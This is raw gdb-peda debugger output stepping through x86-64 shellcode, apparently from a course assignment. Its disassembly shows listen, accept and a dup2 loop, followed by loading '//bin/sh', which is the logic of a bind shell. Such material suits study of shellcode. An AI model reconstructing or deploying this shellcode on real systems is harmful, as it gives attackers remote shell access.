RAX: 0x32 ('2')
RBX: 0x0 
RCX: 0x60106f --> 0x50f32b05f505e52 
RDX: 0x0 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601075 --> 0x5e57050f2bb0050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601071 <code+17>:	push   rax
   0x601072 <code+18>:	pop    rdi
   0x601073 <code+19>:	mov    al,0x32
=> 0x601075 <code+21>:	syscall 
   0x601077 <code+23>:	mov    al,0x2b
   0x601079 <code+25>:	syscall 
   0x60107b <code+27>:	push   rdi
   0x60107c <code+28>:	pop    rsi
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601075 in code ()
gdb-peda$ 







[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601077 --> 0x97485e57050f2bb0 
RDX: 0x0 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601077 --> 0x97485e57050f2bb0 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601072 <code+18>:	pop    rdi
   0x601073 <code+19>:	mov    al,0x32
   0x601075 <code+21>:	syscall 
=> 0x601077 <code+23>:	mov    al,0x2b
   0x601079 <code+25>:	syscall 
   0x60107b <code+27>:	push   rdi
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601077 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x2b ('+')
RBX: 0x0 
RCX: 0x601077 --> 0x97485e57050f2bb0 
RDX: 0x0 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601079 --> 0xceff97485e57050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601073 <code+19>:	mov    al,0x32
   0x601075 <code+21>:	syscall 
   0x601077 <code+23>:	mov    al,0x2b
=> 0x601079 <code+25>:	syscall 
   0x60107b <code+27>:	push   rdi
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601079 in code ()
gdb-peda$ 







[----------------------------------registers-----------------------------------]
RAX: 0x4 
RBX: 0x0 
RCX: 0x60107b --> 0x21b0ceff97485e57 
RDX: 0x0 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x60107b --> 0x21b0ceff97485e57 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601075 <code+21>:	syscall 
   0x601077 <code+23>:	mov    al,0x2b
   0x601079 <code+25>:	syscall 
=> 0x60107b <code+27>:	push   rdi
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107b in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x4 
RBX: 0x0 
RCX: 0x60107b --> 0x21b0ceff97485e57 
RDX: 0x0 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe550 --> 0x3 
RIP: 0x60107c --> 0xf21b0ceff97485e 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601077 <code+23>:	mov    al,0x2b
   0x601079 <code+25>:	syscall 
   0x60107b <code+27>:	push   rdi
=> 0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe550 --> 0x3 
0008| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0024| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0032| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe580 --> 0x0 
0056| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107c in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x4 
RBX: 0x0 
RCX: 0x60107b --> 0x21b0ceff97485e57 
RDX: 0x0 
RSI: 0x3 
RDI: 0x3 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x60107d --> 0x50f21b0ceff9748 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601079 <code+25>:	syscall 
   0x60107b <code+27>:	push   rdi
   0x60107c <code+28>:	pop    rsi
=> 0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107d in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60107b --> 0x21b0ceff97485e57 
RDX: 0x0 
RSI: 0x3 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x60107f --> 0xf875050f21b0ceff 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107b <code+27>:	push   rdi
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
=> 0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107f in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60107b --> 0x21b0ceff97485e57 
RDX: 0x0 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601081 --> 0x4852f875050f21b0 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
=> 0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601081 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x21 ('!')
RBX: 0x0 
RCX: 0x60107b --> 0x21b0ceff97485e57 
RDX: 0x0 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601083 --> 0x2fbf4852f875050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
=> 0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
   0x601092 <code+50>:	push   rdi
Guessed arguments:
arg[0]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601083 in code ()
gdb-peda$ 






[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601085 --> 0x622f2fbf4852f875 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
=> 0x601085 <code+37>:	jne    0x60107f <code+31>
 | 0x601087 <code+39>:	push   rdx
 | 0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
 | 0x601092 <code+50>:	push   rdi
 | 0x601093 <code+51>:	push   rsp
 |->   0x60107f <code+31>:	dec    esi
       0x601081 <code+33>:	mov    al,0x21
       0x601083 <code+35>:	syscall
       => 0x601085 <code+37>:	jne    0x60107f <code+31>
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601085 in code ()
gdb-peda$ 



[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x60107f --> 0xf875050f21b0ceff 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107b <code+27>:	push   rdi
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
=> 0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107f in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601081 --> 0x4852f875050f21b0 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
=> 0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601081 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x21 ('!')
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601083 --> 0x2fbf4852f875050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
=> 0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
   0x601092 <code+50>:	push   rdi
Guessed arguments:
arg[0]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601083 in code ()
gdb-peda$ 






[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601085 --> 0x622f2fbf4852f875 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
=> 0x601085 <code+37>:	jne    0x60107f <code+31>
 | 0x601087 <code+39>:	push   rdx
 | 0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
 | 0x601092 <code+50>:	push   rdi
 | 0x601093 <code+51>:	push   rsp
 |->   0x60107f <code+31>:	dec    esi
       0x601081 <code+33>:	mov    al,0x21
       0x601083 <code+35>:	syscall
       => 0x601085 <code+37>:	jne    0x60107f <code+31>
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601085 in code ()
gdb-peda$ 



[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x60107f --> 0xf875050f21b0ceff 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107b <code+27>:	push   rdi
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
=> 0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107f in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601081 --> 0x4852f875050f21b0 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107c <code+28>:	pop    rsi
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
=> 0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601081 in code ()
gdb-peda$ 








